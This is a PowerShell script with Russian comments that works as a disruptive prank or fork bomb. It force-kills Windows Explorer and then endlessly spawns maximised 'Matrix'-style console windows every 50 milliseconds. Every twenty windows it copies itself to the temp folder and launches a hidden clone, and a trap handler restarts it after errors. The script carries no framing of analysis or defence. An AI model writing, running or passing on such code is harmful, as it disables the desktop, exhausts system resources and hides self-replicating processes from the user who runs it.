# Немедленно убиваем Explorer
Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force

# Функция для создания матричного окна
function New-MatrixWindow {
    param($windowId)
    
    $matrixCode = @'
while ($true) {
    $w = $host.UI.RawUI.WindowSize.Width
    $h = $host.UI.RawUI.WindowSize.Height
    $chars = "01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    for ($i = 0; $i -lt $w; $i++) {
        $char = $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
        $color = @('Green','DarkGreen','White','Gray') | Get-Random
        Write-Host $char -ForegroundColor $color -NoNewline
    }
    Start-Sleep -Milliseconds 30
}
'@

    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
    Set-Content -Path $tempScript -Value $matrixCode
    
    Start-Process powershell -ArgumentList @(
        "-NoExit",
        "-WindowStyle", "Maximized",
        "-File", "`"$tempScript`""
    )
}

# Главный бесконечный цикл
$count = 1
do {
    # Закрываем Explorer
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    
    # Создаем окно с матрицей
    New-MatrixWindow -windowId $count
    $count++
    
    # Быстрое создание окон
    Start-Sleep -Milliseconds 50
    
    # Создаем клон каждые 20 окон
    if ($count % 20 -eq 0) {
        $clonePath = "$env:TEMP\matrix_clone_$(Get-Random).ps1"
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $clonePath
        Start-Process powershell -ArgumentList @("-WindowStyle", "Hidden", "-File", "`"$clonePath`"")
    }
    
} while ($true)

# Вечная защита
trap {
    Start-Sleep -Seconds 3
    & $MyInvocation.MyCommand.Path
}
